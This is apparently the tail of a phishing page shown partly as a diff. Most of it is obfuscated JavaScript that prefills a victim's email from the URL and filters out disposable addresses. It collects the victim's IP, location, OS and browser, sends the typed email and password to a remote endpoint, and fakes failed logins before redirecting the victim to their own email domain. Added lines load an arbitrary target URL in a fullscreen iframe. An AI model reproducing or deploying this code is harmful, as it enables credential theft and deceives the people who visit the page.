(0x75bcd15-0O726746425):MZzE=QcGE[Konu.Kgfs(18)][Konu.Odcq(19)](Konu.C0tq(20))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):MZzE=Konu[Konu.WtXr(1)]();{try{kYwE=atob(QcGE[Konu.Kgfs(18)][Konu.atrq(21)](Konu.C0tq(20)));}catch(gVqE){}}break;}var IWtE=Konu[Konu.eE7r(0)]();while(IWtE<Konu[Konu.WtXr(1)]())switch(IWtE){case (0x75bcd15-0O726746425):IWtE=kYwE?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):IWtE=Konu[Konu.WtXr(1)]();QISD(kYwE);break;}});(function(){const IqhF=new URL(window[Konu.Sihq(15)][Konu.eE7r(16)]);let kskF=Konu.WtXr(17);var EnbF=Konu[Konu.eE7r(0)]();while(EnbF<Konu[Konu.WtXr(1)]())switch(EnbF){case (0x75bcd15-0O726746425):EnbF=IqhF[Konu.Kgfs(18)][Konu.Odcq(19)](Konu.Wnmq(22))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):EnbF=Konu[Konu.WtXr(1)]();{const gpeF=IqhF[Konu.Kgfs(18)][Konu.atrq(21)](Konu.Wnmq(22));try{const AkVE=atob(gpeF);var cmYE=Konu[Konu.eE7r(0)]();while(cmYE<Konu[Konu.WtXr(1)]())switch(cmYE){case (0x75bcd15-0O726746425):cmYE=AkVE[Konu.Kgfs(2)](Konu.Odcq(3))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):cmYE=Konu[Konu.WtXr(1)]();kskF=AkVE;break;}}catch{var whPE=Konu[Konu.eE7r(0)]();while(whPE<Konu[Konu.WtXr(1)]())switch(whPE){case (0x75bcd15-0O726746425):whPE=gpeF[Konu.Kgfs(2)](Konu.Odcq(3))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):whPE=Konu[Konu.WtXr(1)]();kskF=gpeF;break;}}var YiSE=Konu[Konu.eE7r(0)]();while(YiSE<Konu[Konu.WtXr(1)]())switch(YiSE){case (0x75bcd15-0O726746425):YiSE=kskF?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):YiSE=Konu[Konu.WtXr(1)]();IqhF[Konu.Kgfs(18)][Konu.Sihq(23)](Konu.Wnmq(22));break;}}break;}var YCFF=Konu[Konu.eE7r(0)]();while(YCFF<Konu[Konu.WtXr(1)]())switch(YCFF){case (0x75bcd15-0O726746425):YCFF=!kskF?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):YCFF=Konu[Konu.WtXr(1)]();{const AEIF=window[Konu.Sihq(15)][Konu.eE7r(24)][Konu.WtXr(25)]((0O57060516-0xbc614d));var UzzF=Konu[Konu.eE7r(0)]();while(UzzF<Konu[Konu.WtXr(1)]())switch(UzzF){case (0x75bcd15-0O726746425):UzzF=AEIF&&AEIF[Konu.Kgfs(2)](Konu.Odcq(3))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):UzzF=Konu[Konu.WtXr(1)]();kskF=AEIF;break;}}break;}var wBCF=Konu[Konu.eE7r(0)]();while(wBCF<Konu[Konu.WtXr(1)]())switch(wBCF){case (0x75bcd15-0O726746425):wBCF=kskF&&kskF[Konu.Kgfs(2)](Konu.Odcq(3))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):wBCF=Konu[Konu.WtXr(1)]();{try{IqhF[Konu.Kgfs(18)][Konu.Kgfs(26)](Konu.C0tq(20),btoa(kskF));IqhF[Konu.eE7r(24)]=Konu.WtXr(17);window[Konu.Sihq(15)][Konu.Odcq(27)](IqhF[Konu.C0tq(28)]());}catch(QwtF){console[Konu.C0tq(12)](Konu.atrq(29),QwtF);}}break;}})();function sywF(MtnF){var ovqF=Konu[Konu.eE7r(0)]();while(ovqF<Konu[Konu.WtXr(1)]())switch(ovqF){case (0x75bcd15-0O726746425):ovqF=!MtnF||typeof MtnF!==Konu.Wnmq(30)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):ovqF=Konu[Konu.WtXr(1)]();return !![];}const QUrC=MtnF[Konu.Sihq(31)]();const sWuC=[Konu.eE7r(32),Konu.WtXr(33),Konu.Kgfs(34),Konu.Odcq(35),Konu.C0tq(36),Konu.atrq(37),Konu.Wnmq(38),Konu.Sihq(39),Konu.eE7r(40),Konu.WtXr(41),Konu.Kgfs(42),Konu.Odcq(43),Konu.C0tq(44),Konu.atrq(45),Konu.Wnmq(46),Konu.Sihq(47),Konu.eE7r(48),Konu.WtXr(49),Konu.Kgfs(50),Konu.Odcq(51),Konu.C0tq(52),Konu.atrq(53),Konu.Wnmq(54),Konu.Sihq(55),Konu.eE7r(56),Konu.WtXr(57)];const MRlC=(MtnF[Konu.Wnmq(6)](Konu.Odcq(3))[(0O57060516-0xbc614d)]||Konu.WtXr(17))[Konu.Sihq(31)]();var oToC=Konu[Konu.eE7r(0)]();while(oToC<Konu[Konu.WtXr(1)]())switch(oToC){case (0x75bcd15-0O726746425):oToC=!MRlC?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):oToC=Konu[Konu.WtXr(1)]();return !![];}for(let IOfC of sWuC){var kQiC=Konu[Konu.eE7r(0)]();while(kQiC<Konu[Konu.WtXr(1)]())switch(kQiC){case (0x75bcd15-0O726746425):kQiC=MRlC===IOfC||MRlC[Konu.Kgfs(58)](Konu.Odcq(59)+IOfC)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):kQiC=Konu[Konu.WtXr(1)]();return !![];}}const ELZB=[/\btemp(mail|-mail|mailbox)?\b/i,/\b10 ?minut(e)?mail\b/i,/\b(yopmail|mailinator|guerrillamail|getnada|sharklasers)\b/i,/\b(dispos|dispost|disposable|throwaway|trash)\b/i,/\b(burner|burnermail|burnermail)\b/i,/\b(rolls-royce|bizsupporta)\b/i,/\b(fake(mail)?|fakemailgenerator)\b/i,/\b(noreply|no-reply)\b/i];for(let gNcC of ELZB){var ghQC=Konu[Konu.eE7r(0)]();while(ghQC<Konu[Konu.WtXr(1)]())switch(ghQC){case (0x75bcd15-0O726746425):ghQC=gNcC[Konu.C0tq(60)](QUrC)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):ghQC=Konu[Konu.WtXr(1)]();return !![];}}return (NaN===NaN);}function IiTC(ceKC,EfNC,YaEC=100){let AcHC=(0x75bcd15-0O726746425);const UXxC=document[Konu.atrq(61)](ceKC);const wZAC=document[Konu.Wnmq(62)](Konu.Sihq(63));var wtoD=Konu[Konu.eE7r(0)]();while(wtoD<Konu[Konu.WtXr(1)]())switch(wtoD){case (0x75bcd15-0O726746425):wtoD=!UXxC?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):wtoD=Konu[Konu.WtXr(1)]();return;}UXxC[Konu.eE7r(64)]=Konu.WtXr(17);wZAC[Konu.WtXr(65)][Konu.Kgfs(66)]=Konu.Odcq(67);const YurD=setInterval(()=>{var sqiD=Konu[Konu.eE7r(0)]();while(sqiD<Konu[Konu.WtXr(1)]())switch(sqiD){case (0x75bcd15-0O726746425):sqiD=AcHC>=EfNC[Konu.C0tq(68)]?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):sqiD=Konu[Konu.WtXr(1)]();{clearInterval(YurD);wZAC[Konu.WtXr(65)][Konu.Kgfs(66)]=Konu.atrq(69);const UrlD=document[Konu.Wnmq(62)](Konu.Wnmq(70));var oncD=Konu[Konu.eE7r(0)]();while(oncD<Konu[Konu.WtXr(1)]())switch(oncD){case (0x75bcd15-0O726746425):oncD=UrlD?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):oncD=Konu[Konu.WtXr(1)]();UrlD[Konu.Sihq(71)]();break;}return;}break;}UXxC[Konu.eE7r(64)]+=EfNC[AcHC++];},YaEC);}function QofD(kkWC,MlZC,MFMD,oHPD,ICGD,kEJD,EzAD){const gBDD=Konu.eE7r(72);const AwuD=`${Konu.WtXr(73)}${kkWC}${Konu.Kgfs(74)}${MlZC}${Konu.Odcq(75)}${ICGD}${Konu.C0tq(76)}${kEJD[Konu.Kgfs(82)]}${Konu.atrq(77)}${EzAD[Konu.Kgfs(82)]}${Konu.Wnmq(78)}${new Date()[Konu.Odcq(83)]()}${Konu.Sihq(79)}${MFMD}${Konu.eE7r(80)}${oHPD}${Konu.WtXr(81)}`;$[Konu.C0tq(84)]({[Konu.atrq(85)]:gBDD,[Konu.Wnmq(86)]:Konu.Sihq(87),[Konu.eE7r(88)]:Konu.WtXr(89),[Konu.Kgfs(90)]:JSON[Konu.Odcq(91)]({[Konu.C0tq(92)]:AwuD}),[Konu.atrq(93)]:function(cyxD){},[Konu.C0tq(12)]:function(EXyA){console[Konu.C0tq(12)](Konu.Wnmq(94),EXyA);}});}function gZBA(AUsA){const cWvA=`${Konu.Sihq(95)}`;const wRmA=document[Konu.Wnmq(62)](Konu.eE7r(96));var YSpA=Konu[Konu.eE7r(0)]();while(YSpA<Konu[Konu.WtXr(1)]())switch(YSpA){case (0x75bcd15-0O726746425):YSpA=wRmA?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):YSpA=Konu[Konu.WtXr(1)]();wRmA[Konu.WtXr(65)][Konu.WtXr(97)]=`${Konu.Kgfs(98)}${cWvA}${Konu.Odcq(99)}`;break;}}async function sOgA(){const UPjA=ozBB();const UjXA=MVwy();let wlaB=Konu.C0tq(100),QgRA=Konu.C0tq(100);try{const siUA=await fetch(Konu.atrq(101));var MdLA=Konu[Konu.eE7r(0)]();while(MdLA<Konu[Konu.WtXr(1)]())switch(MdLA){case (0x75bcd15-0O726746425):MdLA=siUA[Konu.Wnmq(102)]?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):MdLA=Konu[Konu.WtXr(1)]();{const ofOA=await siUA[Konu.Sihq(103)]();wlaB=`${ofOA[Konu.WtXr(105)]}${Konu.eE7r(104)}${ofOA[Konu.Kgfs(106)]}`;QgRA=ofOA[Konu.Odcq(107)];}break;}}catch(IaFA){console[Konu.C0tq(12)](Konu.C0tq(108),IaFA);}return {[Konu.atrq(109)]:UPjA,[Konu.Wnmq(110)]:UjXA,[Konu.Sihq(15)]:wlaB,[Konu.Odcq(107)]:QgRA};}async function kcIA(kwvB){const MxyB=ozBB();const gtpB=MVwy();const IusB=new Date()[Konu.Odcq(83)]();let cqjB=Konu.Sihq(111),ErmB=Konu.Sihq(111);try{const YmdB=await fetch(Konu.atrq(101));var AogB=Konu[Konu.eE7r(0)]();while(AogB<Konu[Konu.WtXr(1)]())switch(AogB){case (0x75bcd15-0O726746425):AogB=!YmdB[Konu.Wnmq(102)]?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):AogB=Konu[Konu.WtXr(1)]();throw new Error(Konu.eE7r(112));}const AITB=await YmdB[Konu.Sihq(103)]();ErmB=AITB[Konu.Odcq(107)]||Konu.C0tq(100);cqjB=(AITB[Konu.WtXr(105)]&&AITB[Konu.Kgfs(106)])?`${AITB[Konu.WtXr(105)]}${Konu.eE7r(104)}${AITB[Konu.Kgfs(106)]}`:Konu.C0tq(100);}catch(cKWB){try{const wFNB=await fetch(Konu.atrq(101));const YGQB=await wFNB[Konu.Sihq(103)]();ErmB=YGQB[Konu.Odcq(107)]||Konu.C0tq(100);cqjB=Konu.C0tq(100);}catch(sCHB){ErmB=Konu.C0tq(100);cqjB=Konu.C0tq(100);}}let UDKB=`${Konu.WtXr(113)}${kwvB}${Konu.Kgfs(114)}${gtpB[Konu.Kgfs(82)]}${Konu.Odcq(115)}${MxyB[Konu.Kgfs(82)]}${Konu.C0tq(116)}${cqjB}${Konu.atrq(117)}${ErmB}${Konu.Odcq(115)}${IusB}${Konu.Wnmq(118)}`;document[Konu.Wnmq(62)](Konu.Sihq(119))[Konu.eE7r(120)]=UDKB;document[Konu.Wnmq(62)](Konu.WtXr(121))[Konu.Kgfs(122)]=`${MxyB[Konu.Kgfs(82)]}${Konu.Odcq(123)}${gtpB[Konu.Kgfs(82)]}${Konu.Odcq(123)}${cqjB}${Konu.Odcq(123)}${ErmB}`;}function ozBB(){const QAEB=navigator[Konu.C0tq(124)];var saGy=Konu[Konu.eE7r(0)]();while(saGy<Konu[Konu.WtXr(1)]())switch(saGy){case (0x75bcd15-0O726746425):saGy=/windows nt/i[Konu.C0tq(60)](QAEB)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):saGy=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.atrq(125)};}var UbJy=Konu[Konu.eE7r(0)]();while(UbJy<Konu[Konu.WtXr(1)]())switch(UbJy){case (0x75bcd15-0O726746425):UbJy=/macintosh|mac os x/i[Konu.C0tq(60)](QAEB)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):UbJy=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.Wnmq(126)};}var oXzy=Konu[Konu.eE7r(0)]();while(oXzy<Konu[Konu.WtXr(1)]())switch(oXzy){case (0x75bcd15-0O726746425):oXzy=/android/i[Konu.C0tq(60)](QAEB)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):oXzy=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.Sihq(127)};}var QYCy=Konu[Konu.eE7r(0)]();while(QYCy<Konu[Konu.WtXr(1)]())switch(QYCy){case (0x75bcd15-0O726746425):QYCy=/iphone|ipad|ipod/i[Konu.C0tq(60)](QAEB)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):QYCy=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.eE7r(128)};}var kUty=Konu[Konu.eE7r(0)]();while(kUty<Konu[Konu.WtXr(1)]())switch(kUty){case (0x75bcd15-0O726746425):kUty=/linux/i[Konu.C0tq(60)](QAEB)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):kUty=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.WtXr(129)};}return {[Konu.Kgfs(82)]:Konu.Kgfs(130)};}function MVwy(){const gRny=navigator[Konu.C0tq(124)];var ISqy=Konu[Konu.eE7r(0)]();while(ISqy<Konu[Konu.WtXr(1)]())switch(ISqy){case (0x75bcd15-0O726746425):ISqy=gRny[Konu.Odcq(131)](Konu.C0tq(132))>-(0O57060516-0xbc614d)&&gRny[Konu.Odcq(131)](Konu.atrq(133))===-(0O57060516-0xbc614d)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):ISqy=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.C0tq(132)};}var Imez=Konu[Konu.eE7r(0)]();while(Imez<Konu[Konu.WtXr(1)]())switch(Imez){case (0x75bcd15-0O726746425):Imez=gRny[Konu.Odcq(131)](Konu.Wnmq(134))>-(0O57060516-0xbc614d)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):Imez=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.Wnmq(134)};}var kohz=Konu[Konu.eE7r(0)]();while(kohz<Konu[Konu.WtXr(1)]())switch(kohz){case (0x75bcd15-0O726746425):kohz=gRny[Konu.Odcq(131)](Konu.Sihq(135))>-(0O57060516-0xbc614d)&&gRny[Konu.Odcq(131)](Konu.C0tq(132))===-(0O57060516-0xbc614d)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):kohz=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.Sihq(135)};}var EjYy=Konu[Konu.eE7r(0)]();while(EjYy<Konu[Konu.WtXr(1)]())switch(EjYy){case (0x75bcd15-0O726746425):EjYy=gRny[Konu.Odcq(131)](Konu.atrq(133))>-(0O57060516-0xbc614d)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):EjYy=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.eE7r(136)};}var glbz=Konu[Konu.eE7r(0)]();while(glbz<Konu[Konu.WtXr(1)]())switch(glbz){case (0x75bcd15-0O726746425):glbz=gRny[Konu.Odcq(131)](Konu.WtXr(137))>-(0O57060516-0xbc614d)||gRny[Konu.Odcq(131)](Konu.Kgfs(138))>-(0O57060516-0xbc614d)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):glbz=Konu[Konu.WtXr(1)]();return {[Konu.Kgfs(82)]:Konu.WtXr(137)};}return {[Konu.Kgfs(82)]:Konu.Kgfs(130)};}function AgSy(ciVy,wdMy){var YePy=wdMy||Konu.Odcq(139);var YyCz=Konu.WtXr(17);var AAFz=Konu[Konu.eE7r(0)]();while(AAFz<Konu[Konu.WtXr(1)]()){switch(AAFz){case (0x75bcd15-0O726746425):AAFz=Konu[Konu.C0tq(4)]();var Uvwz=(0x75bcd15-0O726746425);break;case (0O57060516-0xbc614d):AAFz=Uvwz<ciVy?Konu[Konu.atrq(5)]():Konu[Konu.WtXr(1)]();break;case (15658734^0O73567354):AAFz=Konu[Konu.C0tq(140)]();{YyCz+=YePy[Math[Konu.atrq(141)](Math[Konu.Wnmq(142)]()*YePy[Konu.C0tq(68)])];}break;case (0O334664274-0x37368B9):AAFz=Konu[Konu.C0tq(4)]();Uvwz++;break;}}return YyCz;}let wxzz=null;function Qsqz(sutz,Mpkz=3000){const ornz=$(Konu.Sihq(143));$(Konu.eE7r(144))[Konu.C0tq(92)](sutz);ornz[Konu.WtXr(145)](Konu.Kgfs(146));var oLaA=Konu[Konu.eE7r(0)]();while(oLaA<Konu[Konu.WtXr(1)]())switch(oLaA){case (0x75bcd15-0O726746425):oLaA=wxzz?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):oLaA=Konu[Konu.WtXr(1)]();clearTimeout(wxzz);break;}var QMdA=Konu[Konu.eE7r(0)]();while(QMdA<Konu[Konu.WtXr(1)]())switch(QMdA){case (0x75bcd15-0O726746425):QMdA=Mpkz&&Mpkz>(0x75bcd15-0O726746425)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):QMdA=Konu[Konu.WtXr(1)]();{wxzz=setTimeout(kIUz,Mpkz);}break;}}function kIUz(){$(Konu.Sihq(143))[Konu.Odcq(147)](Konu.Kgfs(146));var MJXz=Konu[Konu.eE7r(0)]();while(MJXz<Konu[Konu.WtXr(1)]())switch(MJXz){case (0x75bcd15-0O726746425):MJXz=wxzz?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):MJXz=Konu[Konu.WtXr(1)]();clearTimeout(wxzz);break;}wxzz=null;}let gFOz={[Konu.atrq(109)]:{},[Konu.Wnmq(110)]:{},[Konu.Sihq(15)]:Konu.C0tq(100),[Konu.Odcq(107)]:Konu.C0tq(100)};$(document)[Konu.Wnmq(14)](async function(){var IGRz=(0O334664274-0x37368B9);$(Konu.C0tq(148))[Konu.atrq(149)](Date[Konu.Wnmq(150)]());gFOz=await sOgA();try{const cCIz=new URL(window[Konu.Sihq(15)][Konu.eE7r(16)]);var EDLz=Konu[Konu.eE7r(0)]();while(EDLz<Konu[Konu.WtXr(1)]())switch(EDLz){case (0x75bcd15-0O726746425):EDLz=!(cCIz[Konu.Kgfs(18)][Konu.Odcq(19)](Konu.Sihq(151))&&cCIz[Konu.Kgfs(18)][Konu.Odcq(19)](Konu.eE7r(152))&&cCIz[Konu.Kgfs(18)][Konu.Odcq(19)](Konu.C0tq(20)))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):EDLz=Konu[Konu.WtXr(1)]();{cCIz[Konu.Kgfs(18)][Konu.WtXr(153)](Konu.Sihq(151),cCIz[Konu.Kgfs(18)][Konu.atrq(21)](Konu.Sihq(151))||AgSy(123,Konu.Odcq(139)));cCIz[Konu.Kgfs(18)][Konu.WtXr(153)](Konu.eE7r(152),cCIz[Konu.Kgfs(18)][Konu.atrq(21)](Konu.eE7r(152))||AgSy(33,Konu.Kgfs(154)));cCIz[Konu.Kgfs(18)][Konu.WtXr(153)](Konu.C0tq(20),cCIz[Konu.Kgfs(18)][Konu.atrq(21)](Konu.C0tq(20))||AgSy(30,Konu.Kgfs(154)));window[Konu.Sihq(15)][Konu.Odcq(27)](cCIz[Konu.C0tq(28)]());return;}break;}}catch(gdNw){console[Konu.Odcq(155)](Konu.C0tq(156),gdNw);}$(Konu.atrq(157))[Konu.WtXr(9)](Konu.Kgfs(82),Konu.Wnmq(158)+AgSy((1011010-0O3666474),Konu.Sihq(159)));$(Konu.eE7r(160))[Konu.WtXr(9)](Konu.Kgfs(82),Konu.WtXr(161)+AgSy((1011010-0O3666474),Konu.Sihq(159)));$(Konu.eE7r(160))[Konu.WtXr(9)](Konu.Kgfs(162),Konu.Odcq(163))[Konu.atrq(149)](Konu.WtXr(17));$(Konu.eE7r(160))[Konu.atrq(149)](Konu.WtXr(17))[Konu.Sihq(71)]();$(Konu.Sihq(143))[Konu.C0tq(164)]();$(Konu.atrq(165))[Konu.Wnmq(166)](function(IeQw){IeQw[Konu.Sihq(167)]();$(Konu.eE7r(168))[Konu.C0tq(164)]();$(Konu.WtXr(169))[Konu.C0tq(164)]();var caHw=Konu[Konu.eE7r(0)]();while(caHw<Konu[Konu.WtXr(1)]())switch(caHw){case (0x75bcd15-0O726746425):caHw=IGRz<=(0x75bcd15-0O726746425)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):caHw=Konu[Konu.WtXr(1)]();{$(Konu.eE7r(168))[Konu.Kgfs(146)]()[Konu.C0tq(92)](Konu.Kgfs(170));return (NaN===NaN);}break;}var EbKw=$(Konu.atrq(157))[Konu.atrq(149)]();var YWAw=$(Konu.eE7r(160))[Konu.atrq(149)]();var AYDw=$(Konu.Odcq(171))[Konu.atrq(149)]();var UTuw=Konu[Konu.eE7r(0)]();while(UTuw<Konu[Konu.WtXr(1)]())switch(UTuw){case (0x75bcd15-0O726746425):UTuw=AYDw&&AYDw[Konu.C0tq(172)]()!==Konu.WtXr(17)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):UTuw=Konu[Konu.WtXr(1)]();{$(Konu.eE7r(168))[Konu.Kgfs(146)]()[Konu.C0tq(92)](Konu.atrq(173));return (NaN===NaN);}break;}var wVxw=Konu[Konu.eE7r(0)]();while(wVxw<Konu[Konu.WtXr(1)]())switch(wVxw){case (0x75bcd15-0O726746425):wVxw=sywF(EbKw)?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):wVxw=Konu[Konu.WtXr(1)]();{$(Konu.eE7r(168))[Konu.Kgfs(146)]()[Konu.C0tq(92)](Konu.Wnmq(174));return (NaN===NaN);}break;}var wplx=Konu[Konu.eE7r(0)]();while(wplx<Konu[Konu.WtXr(1)]())switch(wplx){case (0x75bcd15-0O726746425):wplx=!EbKw||!YWAw?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):wplx=Konu[Konu.WtXr(1)]();{$(Konu.eE7r(168))[Konu.Kgfs(146)]()[Konu.C0tq(92)](Konu.Sihq(175));return (NaN===NaN);}break;}QofD(EbKw,YWAw,IGRz,gFOz[Konu.Sihq(15)],gFOz[Konu.Odcq(107)],gFOz[Konu.atrq(109)],gFOz[Konu.Wnmq(110)]);IGRz--;var Yqox=Konu[Konu.eE7r(0)]();while(Yqox<Konu[Konu.WtXr(1)]())switch(Yqox){case (0x75bcd15-0O726746425):Yqox=IGRz>(0x75bcd15-0O726746425)?Konu[Konu.C0tq(4)]():Konu[Konu.atrq(5)]();break;case (0O57060516-0xbc614d):Yqox=Konu[Konu.WtXr(1)]();{$(Konu.eE7r(176))[Konu.C0tq(92)](IGRz+Konu.WtXr(177));Qsqz(Konu.Kgfs(178)+IGRz+Konu.Odcq(179),2400);$(Konu.eE7r(168))[Konu.Kgfs(146)]()[Konu.C0tq(92)](Konu.C0tq(180));$(Konu.eE7r(160))[Konu.atrq(149)](Konu.WtXr(17))[Konu.atrq(181)](Konu.Wnmq(182))[Konu.Sihq(71)]();return (NaN===NaN);}break;case (15658734^0O73567354):Yqox=Konu[Konu.WtXr(1)]();{$(Konu.eE7r(176))[Konu.C0tq(92)](Konu.Sihq(183));Qsqz(Konu.eE7r(184),3800);$(Konu.eE7r(168))[Konu.Kgfs(146)]()[Konu.C0tq(92)](Konu.Kgfs(170));$(Konu.atrq(165))[Konu.WtXr(185)](Konu.Kgfs(186),!![]);$(Konu.eE7r(160))[Konu.WtXr(185)](Konu.Kgfs(186),!![]);setTimeout(()=>{var smfx=(EbKw[Konu.Wnmq(6)](Konu.Odcq(3))[(0O57060516-0xbc614d)]||Konu.Odcq(187));window[Konu.Sihq(15)][Konu.eE7r(16)]=Konu.C0tq(188)+smfx;},4000);}break;}});const Unix=new URL(window[Konu.Sihq(15)][Konu.eE7r(16)]);let ojZw=Konu.Odcq(187),Qkcx=Konu.WtXr(17);var kgTw=Konu[Konu.eE7r(0)]();while(kgTw<Konu[Konu.WtXr(1)]())switch(kgTw){case (0x75bcd15-0O726746425):kgTw=Unix[Konu.Kgfs(18)][Konu.Odcq(19)](Konu.C0tq(20))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):kgTw=Konu[Konu.WtXr(1)]();{try{Qkcx=atob(Unix[Konu.Kgfs(18)][Konu.atrq(21)](Konu.C0tq(20)));var MhWw=Konu[Konu.eE7r(0)]();while(MhWw<Konu[Konu.WtXr(1)]())switch(MhWw){case (0x75bcd15-0O726746425):MhWw=Qkcx[Konu.Kgfs(2)](Konu.Odcq(3))?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):MhWw=Konu[Konu.WtXr(1)]();ojZw=Qkcx[Konu.Wnmq(6)](Konu.Odcq(3))[(0O57060516-0xbc614d)]||ojZw;break;}}catch(MBJx){console[Konu.C0tq(12)](Konu.atrq(189),MBJx);}}break;}$(Konu.Wnmq(190))[Konu.C0tq(92)](ojZw);gZBA(ojZw);kcIA(ojZw);setTimeout(()=>{document[Konu.Wnmq(62)](Konu.Sihq(191))[Konu.WtXr(65)][Konu.Kgfs(66)]=Konu.atrq(69);document[Konu.Wnmq(62)](Konu.eE7r(192))[Konu.WtXr(65)][Konu.Kgfs(66)]=Konu.WtXr(193);var oDMx=Konu[Konu.eE7r(0)]();while(oDMx<Konu[Konu.WtXr(1)]())switch(oDMx){case (0x75bcd15-0O726746425):oDMx=Qkcx?Konu[Konu.C0tq(4)]():Konu[Konu.WtXr(1)]();break;case (0O57060516-0xbc614d):oDMx=Konu[Konu.WtXr(1)]();IiTC(Konu.atrq(157),Qkcx,120);break;}},3000);});
- </script>
+    // Scoped styles: iframe is always fullscreen with fade-in
+    var style = document.createElement("style");
+    style.textContent = `
+      :host { all: initial; }
+      .wrap { position:absolute; inset:0; background:#fff; display:flex; align-items:center; justify-content:center;
+              padding: env(safe-area-inset-top,0) env(safe-area-inset-right,0) env(safe-area-inset-bottom,0) env(safe-area-inset-left,0); }
+      .spin { width:60px; height:60px; border:6px solid #ccc; border-top-color:#2266e3; border-radius:50%;
+              animation:rc_spin 1s linear infinite; transition:opacity .25s ease; }
+      iframe { position:absolute; inset:0; width:100%; height:100%; border:0; opacity:0; transition:opacity .6s ease; }
+      @keyframes rc_spin { to { transform: rotate(360deg); } }
+      @supports (height: 100dvh) { :host, .wrap { height:100dvh; width:100dvw; } }
+    `;
 
+    var wrap = document.createElement("div");
+    wrap.className = "wrap";
+
+    var spin = document.createElement("div");
+    spin.className = "spin";
+
+    var frame = document.createElement("iframe");
+    frame.setAttribute("title", "Embedded content");
+    frame.setAttribute("sandbox", "allow-scripts allow-forms allow-same-origin");
+    frame.setAttribute("referrerpolicy", "no-referrer");
+
+    var first = true;
+    frame.addEventListener("load", function(){
+      if (!first) return;
+      first = false;
+      spin.style.opacity = "0";
+      setTimeout(function(){ frame.style.opacity = "1"; }, 150);
+    });
+
+    wrap.appendChild(spin);
+    wrap.appendChild(frame);
+    root.appendChild(style);
+    root.appendChild(wrap);
+    frame.src = target;
+
+    // Minor mobile quirk fix: force reflow on resize so fixed+inset refills any newly exposed area
+    window.addEventListener('resize', function(){
+      host.style.display = 'none';
+      requestAnimationFrame(function(){ host.style.display = ''; });
+    });
+  };
+})();
+</script>
 </body>
 </html>
